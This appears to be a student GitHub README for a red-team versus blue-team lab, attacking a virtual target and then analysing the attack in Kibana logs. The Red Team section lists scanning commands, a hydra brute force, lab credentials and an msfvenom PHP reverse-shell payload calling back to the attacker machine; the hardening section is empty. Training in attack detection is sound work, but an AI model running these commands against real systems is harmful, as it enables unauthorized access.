# RedTeam_vs_BlueTeam
# Security Assessment, Analysis, and Hardening Project
This Red Team vs. Blue Team project is organized into the following sections:
- **Network Topology** Red Team vs. Blue Team live network environment
- **Red Team** Security Assessment
- **Blue Team** Log Analysis and Attack Characterization
- **Hardening** Proposed Alarms and Mitigation Strategies
___

In this activity, Red Team acts as a malicious actor attempting to gain unauthorized access to a network. Blue Team monitors and analyses the activity. The ultimate objective is for Blue Team to identify vulnerabilities and to improve network security. 

### Network Topology

In this environment Blue Team is defending against Red Team attacks.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/3122a604b745c825d67c88767017092a2c29fa79/images/RvBNetworkTopology.png)

|  IP                     |  Machine              |  OS          |  Role                              |
|  -----------------------|:---------------------:|:------------:|:----------------------------------:|
|  192.168.1.0/24         | Network Address Range |              |                                    |
|  255.255.255.0          | Netmask               |              |                                    |
|  192.168.1.1            | Azure Hyper-V         | Windows 10   | Host Machine                       |
|  192.168.1.90           | Kali Linux            | Linux 2.6.32 | Attacking Machine                  |
|  192.168.1.100          | ELK-Stack             | Linux        | Network Monitoring / Kibana        |
|  192.168.1.105          | Capstone              | Linux        | Target Machine / Vulnerable Server |


---


### Red Team: Security Assessment
---
#### Exploitation #### 
---
Discover target IP
`ifconfig`

`netdiscover -Pr 192.168.1.0/16`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/netdiscover.png)

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/netdiscover2.png)

`nmap 192.168.1.90/24`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap2.png)


#### Service and Version Scan ####

'nmap -A --script-vuln -v 192.168.1.105`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap-a.png)

#### Navigate Webserver ####

`dirb http://192.168.1.105`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/dirb.png)

Access `http://192.168.1.105` via VM web browser

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/browse1.png)

Navigate directories to ID the file containing information about the secret directory

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/browse2.png)

#### Brute Force ####
Brute force the password for the hidden directory using the ‘hydra’ command and access the secret folder 

`hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get “/company_folders/secret_folder/”`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/hydra1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/hydra2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/secfolder1.png)

#### Password Hash ####

Break the hashed password using crackstation.net
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/crack1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/crack2.png)

#### SSH ####

SSH into Ashton's account to locate flag
`ssh ashton@192.168.1.105`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh4.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh5.png)

#### WebDAV ####

Connect to the server via WebDAV
Useername: `ryan`
Password: `linux4u`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/webdav1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/webdav2.png)

#### Reverse Shell ####

Upload a PHP reverse shell payload

Create ‘shell.php’ shell script
`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell1.png)

Upload payload to WebDAV system
`cadaver http://192.168.1.105/webdav`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell4.png)

Execute payload that you uploaded to the site to open up a meterpreter session

Setup listener
`msfconsole`
`use multi/handler`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list4.png)

Once ‘shell.php’ shell script is uploaded to target website and is clicked on, attacking Kali machine will connect
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/shellupload.png)

Meterpreter session is now open
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/meterpretersession_open.png)

Acquire interactive reverse ‘shell’
`python -c 'import pty: pty.spawn("/bin/bash")'www-data@server:/var/www/webdav$`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/intrevshell.png)
#### Exfiltration ####
Find and capture flag
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg2.png)

Exit back to meterpreter session
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/exitbackmeterpreter.png)

Download ‘flag.txt’ to Kali machine
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/dwnlodflg.png)

### Vulnerabilities ###
---
#### 1. ####



---


### Blue Team: Log Analysis and Attack Characterization
---


#### Log Analysis and Attack Characterization ####
---

#### 1. ID Offensive Traffic ####
---
ID Port Scans

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1d.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1e.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1f.png)

![image]()


##### When did the interaction occur? #####

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1g.png)

Between 12:30 and 15:30 on 2021 December 8
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1h.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1i.png)

##### What responses did the victim send back? #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1j.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1k.png)

##### What data is concerning from the Blue Team perspective? #####

Data indicating the sudden spike in traffic and data indicating successful malicious traffic connection is concerning from a Blue Team perspective.

![image]()

#### 2. Find the Request for the Hidden Directory ####
---
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2a.pnghttps://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2d.png)




31,064 requests were made from 192.168.1.90 to the secret directory at http://192.168.1.105/company_folders/secret_folders/ roughly between December 28, 13:33:30 and December 28, 15:14:00.


##### Which files were requested? What information did they contain? #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2e.png)

Requests were made to access HTML text in ISO character set.

##### What kind of alarm would you set to detect this behavior in the future? #####

Creating an alert to notify administrators of when three or more password login attempts are failed in succession.

##### Identify at least one way to harden the vulnerable machine that would mitigate this attack. #####

Create a timed lockout rule to prevent IPs or specific user credentials from being used for attempted logins after the failed password threshold is reached.

#### 3. Identify the Brute Force Attack ####
---
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3c.png)

##### Can you identify packets specifically from Hydra? #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3d.png)

##### How many requests were made in the brute force attack? #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3e.png)

Two brute force attacks occurred. One from 13:30 to 13:34 and another at 15:12:55 to 15:14:00. There were a combined 31,064 requests made.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3f.png)

##### How many requests had the attacker made before discovering the correct password in this one? #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3g.png)

The first attack made 16,236 before discovering the password.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3h1.png)

The second attack made 14,828 requests before discovering the password.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3i.png)

##### What kind of alarm would you set to detect this behavior in the future? ##### 

Create a baseline for what is a normal number of requests over time. Trigger an alert when the upper threshold of that baseline is exceeded.

##### Identify at least one way to harden the vulnerable machine that would mitigate this attack. ##### 

Limiting the amount of login attempts per user or IP to lockout excessive traffic requests. 
Establishing robust password practices will help limit the likelihood of successful brute force attacks.

Password length and character requirements.

Require updated passwords every 1-3 months depending on security needs.

#### 4. Find the WebDAV Connection ####
---
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4d.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4e.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4f.png)

##### How many requests were made to this directory? #####

20
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4g.png)

##### Which file(s) were requested? ##### 
Access to the HTML text file with an ISO character set located at http://192.168.1.105/webdav is being requested.

##### What kind of alarm would you set to detect this behavior in the future? ##### 

Create an alarm that triggers when non-approved IP addresses attempt to access WebDAV.

##### Identify at least one way to harden the vulnerable machine that would mitigate this attack. ##### 

Monitor IPs and user credentials attempting to access WebDAV. Whitelist approved IP addresses. Reduce user access to WebDAV. Switch to HTTPS.

#### 5.	Identify the Reverse Shell and Meterpreter Traffic. ####
---

##### Identify the traffic from the meterpreter session ‘url.path: /webdav/shell.php’ #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/5a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/5b.png)

##### What kind of alarm would you set to detect this behavior in the future? #####
Create an alarm to monitor for malicious uploads.

##### Identify at least one way to harden the vulnerable machine that would mitigate this attack. #####
Maintain up-to-date anti-virus and anti-malware software. Monitor open ports (such as 22 and 80) closely for suspicious traffic. Maintain robust firewall preventing suspicious file uploads to internal network systems.












![image]()
![image]()
![image]()
![image]()
![image]()
![image]()
![image]()











![image]()
![image]()
![image]()
![image]()
![image]()
![image]()


![image]()
![image]()
![image]()

























































### Hardening: Proposed Alarms and Mitigation Strategies
